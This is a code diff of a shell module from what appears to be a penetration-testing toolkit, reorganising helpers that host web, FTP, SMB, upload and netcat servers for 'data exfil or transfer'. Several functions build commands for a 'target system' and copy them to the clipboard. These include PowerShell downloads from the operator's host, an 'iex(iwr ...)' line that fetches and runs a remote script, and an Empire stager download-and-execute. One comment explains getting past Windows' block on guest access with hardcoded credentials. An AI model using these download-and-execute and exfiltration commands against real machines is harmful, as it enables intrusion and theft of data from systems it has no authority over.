@@ -10,21 +10,32 @@ nb-srv
 -------
 The srv namespace provides commands for hosting local services such as web, ftp, smb and other services for data exfil or transfer.
 
-Commands
---------
-nb-srv-install          install dependencies
-nb-srv-file-download    select command to download a payload into a target machine
-nb-srv-empire-stager    command to download and execute empire stager in a target machine
-nb-srv-web              hosts a python web server in current dir
-nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
-nb-srv-uploadserver-upload   commands to upload a file to 'uploadserver' using powershell
-nb-srv-ftp              hosts a python ftp server in current dir
-nb-srv-ftp-down         command to download the file from ftp server
-nb-srv-smb              hosts an impacket smb server in current dir
-nb-srv-smb-down         commands to download the file from smb server
+Commands to just host a server
+-------------------------
+nb-srv-web              hosts a python web server in server dir
 nb-srv-tftp             starts the atftpd service in /srv/tftp
 nb-srv-smtp             hosts a python smtp server in current dir
-nb-srv-updog            hosts an updog web server in current dir
+nb-srv-updog            hosts a updog web server in server dir
+nb-srv-ngrok            hosts a ngrok web server in server dir
+
+Commands to download a file from server
+-------------------------------------
+nb-srv-ftp              hosts a python ftp server in current dir
+
+Commands to upload a file to a server
+-------------------------------------
+nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
+nb-srv-smb              hosts an impacket smb server in current dir
+nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
+nb-srv-smb-http         hosts an SMB over HTTP with WebDav
+
+General Commands
+-------------------------------------
+nb-srv-install          install dependencies
+nb-srv-file-download    select one of general commands to download a payload into a target machine
+nb-srv-empire-stager    command to download and execute empire stager in a target machine
+
+
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
 nb-srv-nc-file          hosts a netcat server > file in current dir
 nb-srv-nc-b64           hosts a netcat server > decode b64 file in current dir
@@ -127,14 +138,10 @@ iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
 }
 
 nb-srv-web() {
-	print -z "sudo python -m http.server 80"
+	print -z "cd \"$HOME/desktop/server\" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000"
 }
 
 nb-srv-uploadserver() {
-	print -z "sudo python3 -m uploadserver"
-}
-
-nb-srv-uploadserver-upload() {
   nb-vars-set-lhost
   nb-vars-set-lport
   local path && __askvar path "FULL_PATH_TO_FILE"
@@ -145,13 +152,11 @@ nb-srv-uploadserver-upload() {
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
+
+	print -z "sudo python3 -m uploadserver"
 }
 
 nb-srv-ftp() {
-	print -z "sudo python -m pyftpdlib -p 21 -w"
-}
-
-nb-srv-ftp-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
@@ -159,13 +164,11 @@ nb-srv-ftp-down() {
   __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
+
+	print -z "sudo python -m pyftpdlib -p 21 -w"
 }
 
 nb-srv-smb() {
-	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
-}
-
-nb-srv-smb-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
@@ -173,6 +176,8 @@ nb-srv-smb-down() {
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
+
+	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare"
 }
 
 nb-srv-smb-http() {
@@ -189,12 +194,7 @@ nb-srv-smb-http() {
   print -z "sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous"
 }
 
-# New versions of Windows block unauthenticated guest access, to bypass set username and pass
 nb-srv-smb-auth() {
-	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
-}
-
-nb-srv-smb-auth-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
@@ -204,6 +204,9 @@ nb-srv-smb-auth-down() {
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
   __info "2 Commands to use on a target system copied to clipboard"
+
+  # New versions of Windows block unauthenticated guest access, to bypass set username and pass
+	print -z "sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test"
 }
 
 nb-srv-ngrok() {
